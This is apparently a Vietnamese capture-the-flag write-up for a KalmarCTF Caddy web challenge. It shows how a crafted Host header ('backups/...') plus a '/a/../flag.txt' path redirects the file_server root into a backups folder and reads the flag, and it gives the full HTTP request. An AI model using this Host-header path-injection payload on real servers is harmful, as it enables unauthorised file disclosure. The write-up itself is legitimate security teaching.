# Solution

Ở file `Caddyfile`, ta thấy có một đoạn cấu hình khá thú vị

```
    file_server {
        root /srv/{host}/
    }
```

[file_server directive](https://caddyserver.com/docs/caddyfile/directives/file_server) này sẽ append request URI vào root path được chỉ định bởi [root directive](https://caddyserver.com/docs/caddyfile/directives/root). Bên cạnh đó root directive của server có thể được thay đổi dựa vào `{host}` - `{http.request.host}` - là Host header của chúng ta.

Chú ý phần `command` ở file `docker-compose.yml`, file flag.txt sẽ bị xóa nhưng tác giả đã lưu các thông tin trước khi xóa (bao gồm cả flag.txt) vào folder backups, vì vậy ta có thể lợi dụng để chuyển root directive về folder backups này và đọc file flag.txt


Final request payload:

```
GET /a/../flag.txt HTTP/1.1
Host: backups/php.caddy.chal-kalmarc.tf
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="91", " Not;A Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

- Sử dụng `/a/../flag.txt` bởi vì nếu là `/flag.txt` thì server sẽ response với status code là `403`
- Phần host header là `backups/php.caddy.chal-kalmarc.tf`, để match với block `*.caddy.chal-kalmarc.tf` 